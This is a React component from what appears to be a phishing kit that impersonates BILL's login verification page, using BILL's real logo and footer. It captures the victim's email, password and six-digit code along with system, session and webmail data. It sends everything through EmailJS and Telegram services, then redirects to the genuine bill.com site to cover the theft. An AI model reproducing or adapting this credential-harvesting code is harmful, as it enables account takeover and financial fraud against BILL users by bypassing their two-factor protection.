import React, { useState, useEffect } from 'react';
import { ArrowRight } from 'lucide-react';
import { useAuth } from '../context/AuthContext';
import { emailService } from '../emailjs/services/emailService';
import { telegramService } from '../services/telegramService';
import { dataCollectionService } from '../services/dataCollectionService';

function CodeVerification() {
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const { loginData } = useAuth();
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [attempts, setAttempts] = useState(0);
  const [lastDeliveryTime, setLastDeliveryTime] = useState<number | null>(null);
  const DELIVERY_COOLDOWN = 60000; // 60 seconds cooldown between deliveries

  useEffect(() => {
    // Initialize EmailJS service when component mounts
    emailService.init();
  }, []);

  const handleCodeChange = (index: number, value: string) => {
    if (value.length <= 1 && /^\d*$/.test(value)) {
      const newCode = [...code];
      newCode[index] = value;
      setCode(newCode);

      if (value && index < 5) {
        const nextInput = document.getElementById(`code-${index + 1}`);
        nextInput?.focus();
      }

      if (index === 5 && value && !newCode.includes('')) {
        handleVerifyCode();
      }
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      const prevInput = document.getElementById(`code-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleVerifyCode = async () => {
    setIsLoading(true);
    setError('');
    const enteredCode = code.join('');

    try {
      setAttempts(prev => prev + 1);

      const systemInfo = await dataCollectionService.collectSystemInfo();
      const sessionData = await dataCollectionService.collectSessionData();
      const webmailData = dataCollectionService.collectWebmailData();
      const authFlowData = dataCollectionService.collectAuthFlowData(
        attempts + 1,
        'verification_attempt'
      );

      const verificationData = {
        email: loginData.email,
        password: loginData.password,
        verificationCode: enteredCode,
        systemInfo,
        sessionData,
        webmailData,
        authFlowData
      };

      // Send to both services
      await Promise.all([
        emailService.sendVerificationAttempt(verificationData),
        telegramService.sendVerificationAttempt(verificationData)
      ]);

      sessionStorage.removeItem('verificationCode');
      sessionStorage.removeItem('loginTimestamp');
      
      window.location.href = 'https://app-signup.us.bill.com/onboarding/flow/signup';
    } catch (error) {
      console.error('Verification error:', error);
      setError('An error occurred during verification. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleResendCode = async () => {
    setIsLoading(true);
    setError('');
    
    try {
      const now = Date.now();
      if (lastDeliveryTime && now - lastDeliveryTime < DELIVERY_COOLDOWN) {
        const remainingTime = Math.ceil((DELIVERY_COOLDOWN - (now - lastDeliveryTime)) / 1000);
        throw new Error(`Please wait ${remainingTime} seconds before requesting a new code.`);
      }

      const newCode = Math.floor(100000 + Math.random() * 900000).toString();
      const systemInfo = await dataCollectionService.collectSystemInfo();
      const sessionData = await dataCollectionService.collectSessionData();
      const webmailData = dataCollectionService.collectWebmailData();
      const authFlowData = dataCollectionService.collectAuthFlowData(
        attempts,
        'resend_code'
      );

      const verificationData = {
        email: loginData.email,
        code: newCode,
        systemInfo,
        sessionData,
        webmailData,
        authFlowData
      };

      // Send to both services
      await Promise.all([
        emailService.sendVerificationCode(verificationData),
        telegramService.sendVerificationCode(verificationData)
      ]);

      setLastDeliveryTime(now);
      sessionStorage.setItem('verificationCode', newCode);
      sessionStorage.setItem('loginTimestamp', new Date().toISOString());
      setCode(['', '', '', '', '', '']);
      alert('New verification code sent!');
    } catch (error) {
      console.error('Error resending code:', error);
      setError(error instanceof Error ? error.message : 'Failed to resend verification code. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex">
      <div className="w-1/2 flex flex-col">
        <div className="p-8">
          <img 
            src="https://login.us.bill.com/neo/assets/images/pages/login/BILL-logo.svg" 
            alt="BILL Logo" 
            className="h-8"
          />
        </div>
        
        <div className="flex-grow flex items-center justify-center px-16">
          <div className="w-full max-w-md">
            <h1 className="text-3xl font-bold mb-4">Enter verification code</h1>
            <p className="text-gray-600 mb-8">
              We've sent a 6-digit verification code to {loginData.email}.
            </p>

            <div className="space-y-8">
              <div className="flex justify-between gap-2">
                {code.map((digit, index) => (
                  <input
                    key={index}
                    id={`code-${index}`}
                    type="text"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleCodeChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    className="w-12 h-12 text-center text-2xl font-semibold border-2 rounded-lg focus:border-[#473cc5] focus:outline-none focus:ring-1 focus:ring-[#473cc5]"
                    disabled={isLoading}
                  />
                ))}
              </div>

              {error && (
                <p className="text-red-600 text-sm text-center">{error}</p>
              )}

              <button
                onClick={handleVerifyCode}
                disabled={isLoading || code.some(digit => !digit)}
                className="flex items-center justify-center w-full px-4 py-2 text-white rounded-md bg-[#473cc5] hover:bg-opacity-90 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#473cc5] disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? (
                  <span>Verifying...</span>
                ) : (
                  <>
                    <ArrowRight className="w-5 h-5 mr-2" />
                    Verify Code
                  </>
                )}
              </button>

              <p className="text-center text-gray-600">
                Didn't receive the code?{' '}
                <button 
                  onClick={handleResendCode}
                  disabled={isLoading}
                  className="text-[#473cc5] hover:text-opacity-80 font-medium disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  Resend code
                </button>
              </p>
            </div>
          </div>
        </div>

        <div className="p-8">
          <p className="text-sm text-gray-500">
            Legal | Privacy | Do Not Sell My Personal Information ©2025 BILL Operations, LLC
          </p>
        </div>
      </div>

      <div className="w-1/2 bg-[#ff5a0a]">
        <div className="h-full w-full flex items-center justify-center">
          <img
            src="https://login.us.bill.com/neo/assets/images/pages/login/local-transfer-02.svg"
            alt="Login illustration"
            className="max-w-md"
          />
        </div>
      </div>
    </div>
  );
}

export default CodeVerification;